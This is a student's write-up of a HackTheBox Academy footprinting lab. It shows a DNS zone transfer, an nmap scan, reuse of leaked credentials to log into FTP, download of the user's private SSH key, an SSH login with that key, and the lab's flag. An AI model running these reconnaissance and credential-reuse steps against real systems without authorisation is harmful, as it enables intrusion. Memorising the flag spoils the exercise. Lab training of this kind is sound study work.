---
Platform: HackTheBox - Academy
Module: Footprinting
Title: Footprinting Lab - Easy
tags:
  - Lab
  - Academy
  - CPTS
  - Footprinting
  - Host-Based-Enumeration
  - DNS
  - Zone-Transfer
  - FTP
  - Port-21
  - Port-53
  - Port-22
  - SSH-Key
  - Reconnaissance
---

## Description
We were commissioned by the company `Inlanefreight Ltd` to test three different servers in their internal network. The company uses many different services, and the IT security department felt that a penetration test was necessary to gain insight into their overall security posture.

The first server is an internal DNS server that needs to be investigated. In particular, our client wants to know what information we can get out of these services and how this information could be used against its infrastructure. Our goal is to gather as much information as possible about the server and find ways to use that information against the company. However, our client has made it clear that it is forbidden to attack the services aggressively using exploits, as these services are in production.

Additionally, our teammates have found the following credentials `"ceil:qwer1234"`, and they pointed out that some of the company's employees were talking about SSH keys on a forum.

The administrators have stored a `flag.txt` file on this server to track our progress and measure success. Fully enumerate the target and submit the contents of this file as proof.

---

## 1. Initial Reconnaissance & DNS Enumeration

### Reverse DNS Lookup (PTR)
First, we check whether reverse lookup is configured for the target IP:
```shell
dig -x 10.129.7.214 @10.129.7.214
```

Result:
```text
;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 39393
;; flags: qr aa rd; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1
;; WARNING: recursion requested but not available
```
> [!NOTE]
> `NXDOMAIN` indicates that no PTR record is mapped to this IP address and recursion is disabled on this DNS server.

---

### DNS Zone Transfer (AXFR)
Next, we attempt a DNS Zone Transfer using the primary company domain `inlanefreight.htb`:
```shell
dig axfr inlanefreight.htb @10.129.7.214
```

Result:
```shell
; <<>> DiG 9.20.20-1-Debian <<>> axfr inlanefreight.htb @10.129.7.214
;; global options: +cmd
inlanefreight.htb.	604800	IN	SOA	inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
inlanefreight.htb.	604800	IN	TXT	"MS=ms97310371"
inlanefreight.htb.	604800	IN	TXT	"atlassian-domain-verification=t1rKCy68JFszSdCKVpw64A1QksWdXuYFUeSXKU"
inlanefreight.htb.	604800	IN	TXT	"v=spf1 include:mailgun.org include:_spf.google.com include:spf.protection.outlook.com include:_spf.atlassian.net ip4:10.129.124.8 ip4:10.129.127.2 ip4:10.129.42.106 ~all"
inlanefreight.htb.	604800	IN	NS	ns.inlanefreight.htb.
app.inlanefreight.htb.	604800	IN	A	10.129.18.15
internal.inlanefreight.htb. 604800 IN	A	10.129.1.6
mail1.inlanefreight.htb. 604800	IN	A	10.129.18.201
ns.inlanefreight.htb.	604800	IN	A	10.129.34.136
inlanefreight.htb.	604800	IN	SOA	inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
;; Query time: 215 msec
;; SERVER: 10.129.7.214#53(10.129.7.214) (TCP)
;; WHEN: Fri Oct 23 14:01:24 WIB 2026
;; XFR size: 10 records (messages 1, bytes 540)
```
> [!SUCCESS]
> The Zone Transfer succeeded and disclosed internal hostnames and IP addresses:
> - `app.inlanefreight.htb` -> `10.129.18.15`
> - `internal.inlanefreight.htb` -> `10.129.1.6`
> - `mail1.inlanefreight.htb` -> `10.129.18.201`
> - `ns.inlanefreight.htb` -> `10.129.34.136`

---

## 2. Port Scanning & Service Enumeration

We perform an Nmap scan to enumerate open ports and services running on the target server `10.129.7.214`:

```shell
nmap -p- --min-rate 1000 -sV 10.129.7.214
```

Result:
```text
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     ProFTPD
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
53/tcp   open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
2121/tcp open  ftp
```

---

## 3. SSH Authentication Check

We test the discovered credentials `ceil:qwer1234` against SSH (port 22):
```shell
ssh ceil@10.129.7.214
```

Result:
```text
ceil@10.129.7.214: Permission denied (publickey).
```
> [!WARNING]
> SSH password authentication is disabled (`PasswordAuthentication no`). The server requires public key authentication (`id_rsa`), confirming the prompt hint regarding employees discussing SSH keys.

---

## 4. FTP Enumeration (Port 21)

We test the same credentials `ceil:qwer1234` on the FTP service (port 21):
```shell
ftp 10.129.7.214
```

Session:
```text
Connected to 10.129.7.214.
220 ProFTPD Server (ftp.int.inlanefreight.htb) [10.129.7.214]
Name (10.129.7.214:nus): ceil
331 Password required for ceil
Password:
230 User ceil logged in
Remote system type is UNIX.
Using binary mode to transfer files.
```

> [!INFO]
> The FTP banner reveals an internal domain name: `ftp.int.inlanefreight.htb` (`int.inlanefreight.htb`).

Listing files in the home directory (`ls -la`):
```text
ftp> ls -la
229 Entering Extended Passive Mode (|||3365|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   4 ceil     ceil         4096 Nov 10  2021 .
drwxr-xr-x   4 ceil     ceil         4096 Nov 10  2021 ..
-rw-------   1 ceil     ceil          294 Nov 10  2021 .bash_history
-rw-r--r--   1 ceil     ceil          220 Nov 10  2021 .bash_logout
-rw-r--r--   1 ceil     ceil         3771 Nov 10  2021 .bashrc
drwx------   2 ceil     ceil         4096 Nov 10  2021 .cache
-rw-r--r--   1 ceil     ceil          807 Nov 10  2021 .profile
drwx------   2 ceil     ceil         4096 Nov 10  2021 .ssh
-rw-------   1 ceil     ceil          759 Nov 10  2021 .viminfo
226 Transfer complete
```

Using `get` to obtain ssh key : 
```shell
ftp> cd .ssh
250 CWD command successful

ftp> ls
229 Entering Extended Passive Mode (|||45220|)
ge150 Opening ASCII mode data connection for file list
-rw-rw-r--   1 ceil     ceil          738 Nov 10  2021 authorized_keys
-rw-------   1 ceil     ceil         3381 Nov 10  2021 id_rsa
-rw-r--r--   1 ceil     ceil          738 Nov 10  2021 id_rsa.pub
t226 Transfer complete

ftp> get id_rsa
local: id_rsa remote: id_rsa
229 Entering Extended Passive Mode (|||63840|)
150 Opening BINARY mode data connection for id_rsa (3381 bytes)
100% |******************************************************************************************************************************|  3381        1.81 MiB/s    00:00 ETA
226 Transfer complete
3381 bytes received in 00:00 (15.03 KiB/s)
```

---
## 5. Connect to ssh

Since we've got the key, we could connect through ssh :
```shell
ssh -i id_rsa ceil@$ip
```
*Note : Use `chmod 600 id_rsa` if there is any issue about file security.*

Let's read the `.bash_history` to find any useful information : 
```shell
ceil@NIXEASY:~$ cat .bash_history
ls -al
mkdir ssh
cd ssh/
echo "test" > id_rsa
id
ssh-keygen -t rsa -b 4096
cd ..
rm -rf ssh/
ls -al
cd .ssh/
cat id_rsa
ls a-l
ls -al
cat id_rsa.pub >> authorized_keys
cd ..
cd /home
cd ceil/
ls -l
ls -al
mkdir flag
cd flag/
touch flag.txt
vim flag.txt
cat flag.txt
ls -al
mv flag/flag.txt .
```

Take a look at line after `cd /home`, so we knew the `flag.txt` was saved on `/home/flag/flag.txt`

```shell
cat /home/flag/flag.txt
```

# Flag : `HTB{7nrzise7hednrxihskjed7nzrgkweunj47zngrhdbkjhgdfbjkc7hgj}`

---
## Related Concepts : 
[[ftp]], [[CPTS/Footprinting/Sections/DNS|DNS]], [[Nmap]], [[ssh]], [[cat]]


